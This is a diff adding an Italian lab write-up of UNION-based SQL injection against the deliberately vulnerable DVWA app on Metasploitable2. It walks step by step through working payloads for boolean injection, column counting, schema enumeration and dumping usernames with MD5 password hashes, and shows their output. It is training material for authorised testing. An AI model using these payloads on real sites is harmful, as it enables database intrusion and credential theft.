@@ -1662,11 +1662,510 @@ Gli hash applicativi devono essere identificati e documentati, non confusi con p
 
 ---
 
+## DVWA SQL Injection - UNION Based Data Extraction
+
+Durante il laboratorio è stata identificata l’applicazione web vulnerabile DVWA:
+
+```text
+DVWA = Damn Vulnerable Web Application
+```
+
+DVWA è una web application volutamente vulnerabile, usata per esercitarsi su vulnerabilità web in ambiente controllato.
+
+L’applicazione era raggiungibile su:
+
+```text
+http://192.168.1.100/dvwa/
+```
+
+Accesso effettuato con credenziali applicative trovate durante il laboratorio:
+
+```text
+Username: admin
+Password: password
+```
+
+Il livello di sicurezza DVWA è stato impostato su:
+
+```text
+Security Level: low
+```
+
+---
+
+## Obiettivo
+
+L’obiettivo era verificare e sfruttare una vulnerabilità SQL Injection nella sezione:
+
+```text
+SQL Injection
+```
+
+Campo vulnerabile:
+
+```text
+User ID
+```
+
+---
+
+## Test normale
+
+Input inserito:
+
+```text
+1
+```
+
+Risultato:
+
+```text
+First name: admin
+Surname: admin
+```
+
+Interpretazione:
+
+```text
+Il parametro User ID viene usato per recuperare dati utente dal database.
+```
+
+---
+
+## Test con apice singolo
+
+Input inserito:
+
+```sql
+'
+```
+
+Risultato:
+
+```text
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
+```
+
+Interpretazione:
+
+```text
+L’apice singolo genera errore SQL.
+Questo indica che l’input dell’utente viene inserito nella query SQL senza adeguata sanitizzazione.
+La vulnerabilità SQL Injection è probabile.
+```
+
+---
+
+## Boolean-Based SQL Injection
+
+Payload usato:
+
+```sql
+1' OR '1'='1
+```
+
+Risultato:
+
+```text
+First name: admin
+Surname: admin
+
+First name: Gordon
+Surname: Brown
+
+First name: Hack
+Surname: Me
+
+First name: Pablo
+Surname: Picasso
+
+First name: Bob
+Surname: Smith
+```
+
+Interpretazione:
+
+```text
+La condizione '1'='1' è sempre vera.
+La query restituisce tutte le righe della tabella utenti.
+SQL Injection confermata.
+```
+
+Payload con commento finale:
+
+```sql
+1' OR '1'='1' #
+```
+
+Risultato:
+
+```text
+Tutti gli utenti vengono mostrati correttamente.
+```
+
+Interpretazione:
+
+```text
+Il carattere # funziona come commento SQL.
+Permette di ignorare la parte finale della query originale.
+```
+
+---
+
+## Identificazione del numero di colonne
+
+Per usare UNION SELECT è necessario capire quante colonne restituisce la query.
+
+Payload testati:
+
+```sql
+1' ORDER BY 1 #
+1' ORDER BY 2 #
+1' ORDER BY 3 #
+```
+
+Risultato importante:
+
+```text
+Unknown column '3' in 'order clause'
+```
+
+Interpretazione:
+
+```text
+ORDER BY 1 funziona.
+ORDER BY 2 funziona.
+ORDER BY 3 genera errore.
+La query restituisce 2 colonne.
+```
+
+---
+
+## Test UNION SELECT
+
+Payload usato:
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+Risultato:
+
+```text
+First name: admin
+Surname: admin
+
+First name: 1
+Surname: 2
+```
+
+Interpretazione:
+
+```text
+UNION SELECT funziona.
+La query accetta 2 colonne.
+Entrambe le colonne vengono stampate nella pagina.
+È possibile estrarre dati dal database.
+```
+
+---
+
+## Estrazione informazioni database
+
+Payload usato:
+
+```sql
+1' UNION SELECT database(), version() #
+```
+
+Risultato:
+
+```text
+First name: dvwa
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+Database corrente: dvwa
+Versione MySQL: 5.0.51a-3ubuntu5
+```
+
+Payload usato:
+
+```sql
+1' UNION SELECT user(), @@version #
+```
+
+Risultato:
+
+```text
+First name: root@localhost
+Surname: 5.0.51a-3ubuntu5
+```
+
+Interpretazione:
+
+```text
+L’applicazione DVWA interroga il database come utente root@localhost.
+Il database MySQL è una versione vecchia.
+```
+
+---
+
+## Enumerazione tabelle
+
+Payload usato:
+
+```sql
+1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa' #
+```
+
+Risultato:
+
+```text
+First name: guestbook
+Surname: dvwa
+
+First name: users
+Surname: dvwa
+```
+
+Interpretazione:
+
+```text
+Nel database dvwa sono presenti le tabelle:
+- guestbook
+- users
+```
+
+La tabella più interessante è:
+
+```text
+users
+```
+
+---
+
+## Enumerazione colonne
+
+Payload usato:
+
+```sql
+1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' #
+```
+
+Risultato:
+
+```text
+First name: user_id
+Surname: users
+
+First name: first_name
+Surname: users
+
+First name: last_name
+Surname: users
+
+First name: user
+Surname: users
+
+First name: password
+Surname: users
+
+First name: avatar
+Surname: users
+```
+
+Interpretazione:
+
+```text
+La tabella users contiene colonne utili:
+- user_id
+- first_name
+- last_name
+- user
+- password
+- avatar
+```
+
+Le colonne più importanti per l’estrazione credenziali sono:
+
+```text
+user
+password
+```
+
+---
+
+## Dump utenti e hash password
+
+Payload usato:
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+Risultato:
+
+```text
+admin   | 5f4dcc3b5aa765d61d8327deb882cf99
+gordonb | e99a18c428cb38d5f260853678922e03
+1337    | 8d3533d75ae2c3966d7e0d4fcc69216b
+pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7
+smithy  | 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Interpretazione:
+
+```text
+È stato completato il dump della tabella users.
+Sono stati estratti username e hash password.
+Gli hash sembrano MD5.
+```
+
+Hash noto:
+
+```text
+5f4dcc3b5aa765d61d8327deb882cf99 = password
+```
+
+Credenziali applicative confermate:
+
+```text
+admin / password
+smithy / password
+```
+
+---
+
+## Catena completa SQL Injection
+
+```text
+Accesso a DVWA
+↓
+Security level impostato su low
+↓
+Test input normale: 1
+↓
+Test apice singolo: '
+↓
+Errore SQL visibile
+↓
+Boolean SQL Injection: 1' OR '1'='1
+↓
+Commento SQL con #
+↓
+ORDER BY per identificare numero colonne
+↓
+ORDER BY 3 genera errore
+↓
+Query con 2 colonne
+↓
+UNION SELECT 1,2
+↓
+Estrazione database(), version()
+↓
+Estrazione user(), @@version
+↓
+Enumerazione tabelle da information_schema.tables
+↓
+Enumerazione colonne da information_schema.columns
+↓
+Dump user,password dalla tabella users
+↓
+Hash MD5 ottenuti
+```
+
+---
+
+## Payload principali usati
+
+```sql
+'
+```
+
+```sql
+1' OR '1'='1
+```
+
+```sql
+1' OR '1'='1' #
+```
+
+```sql
+1' ORDER BY 1 #
+```
+
+```sql
+1' ORDER BY 2 #
+```
+
+```sql
+1' ORDER BY 3 #
+```
+
+```sql
+1' UNION SELECT 1,2 #
+```
+
+```sql
+1' UNION SELECT database(), version() #
+```
+
+```sql
+1' UNION SELECT user(), @@version #
+```
+
+```sql
+1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa' #
+```
+
+```sql
+1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' #
+```
+
+```sql
+1' UNION SELECT user,password FROM users #
+```
+
+---
+
+## Lezioni apprese
+
+```text
+Un errore SQL visibile può indicare input vulnerabile.
+OR '1'='1' permette di testare una condizione sempre vera.
+ORDER BY aiuta a identificare il numero di colonne.
+UNION SELECT permette di estrarre dati dal database.
+information_schema permette di enumerare database, tabelle e colonne.
+Gli hash password non sono password in chiaro.
+Gli hash vanno identificati e documentati.
+```
+
+---
+
+## Risultato finale
+
+```text
+SQL Injection confermata.
+UNION SQL Injection funzionante.
+Database corrente identificato: dvwa.
+Utente database identificato: root@localhost.
+Tabelle enumerate.
+Colonne enumerate.
+Username e hash password estratti dalla tabella users.
+```
+
+---
+
 ## Nota etica
 
-Questo test è stato svolto esclusivamente su Metasploitable2, macchina vulnerabile progettata per laboratori locali autorizzati.
+Questo test è stato svolto esclusivamente su DVWA, applicazione volutamente vulnerabile installata su Metasploitable2 in ambiente locale autorizzato.
 
-Non utilizzare questi comandi contro sistemi reali senza autorizzazione esplicita.
+Non utilizzare questi payload contro siti reali senza autorizzazione esplicita.
+
 
 
 
